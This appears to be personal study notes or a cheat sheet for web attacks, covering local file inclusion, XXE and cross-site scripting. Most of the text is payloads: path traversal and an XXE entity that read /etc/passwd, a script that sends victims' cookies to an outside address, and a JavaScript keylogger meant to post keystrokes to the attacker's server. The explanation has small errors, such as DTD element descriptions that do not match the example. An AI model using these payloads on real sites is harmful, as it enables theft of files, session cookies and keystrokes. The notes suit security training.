### LFI (local file inclusion)

If you see a parameter you can try LFI on it.
```
http://127.0.0.1/?file=page.php
```
We can not try view a file on the system.
```
http://127.0.0.1/?file=../../../../../../etc/passwd
```

### XXE (XML External Entity)

This abuses features of XML parser/Data.

Let's look at the structure.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE file SYSTEM "file.dtd">
<file>
    <to>moon</to>
    <from>cake</from>
    <heading>food</heading>
    <body>XXE attack</body>
</file> 
```
XML document starts with 
```
<?xml version="1.0" encoding="UTF-8"?> 
```
The next part is called the DTD (Document Type Definition)
This defines the elements and attributes.

- !DOCTYPE note -  Defines a root element of the document named note
- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to - Defines the to element to be of type "#PCDATA"
- !ELEMENT from - Defines the from element to be of type "#PCDATA"
- !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
- !ELEMENT body - Defines the body element to be of type "#PCDATA"

We can abuse this to read a file on a system.
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
or change something
```
<!DOCTYPE replace [<!ENTITY food "cake"> ]>
 <foodInfo>
  <firstName>moon</firstName>
  <lastName>&food;</lastName>
 </foodInfo>
 ```
 
 ### XSS (Cross-Site Scripting)
 
 Injection where an attacker can execute malicious scripts and execute on machine
 
 #### Stored-XSS
 
 See if we can add html tags
 
 <b>comment</b>
 
 See if we can get a popup
 ```
 <script>alert(XSS popup)</script>
 ```
 We can even get cookies or change element with javascript
 
 ```
 <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
 <script>alert(document.cookie)</script>
 ```
 We can also steal cookies from other users.
 
 ```
 <script>window.location='http://192.168.1.10/?cookie='+document.cookie</script>
 ```
 
 ####  Reflected XSS
 ```
 <script>alert("Hello")</script>
 <script>alert(window.location.hostname)</script>
 ```
 #### DOM-Based XSS
 ```
 test" onmouseover="alert('test')
 test" onmouseover="document.body.style.backgroundColor='red'
 ```
#### Keylogger

```
 <script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```

<img SRC="test" onmouseover=alert('Hello') />
<img SRC="test" onmouseover=confirm('Hello') />
<img SRC="test" onmouseover=alert('HHelloello') />
<img SRC="test" ONMOUSEOVER=alert('HHelloello') />
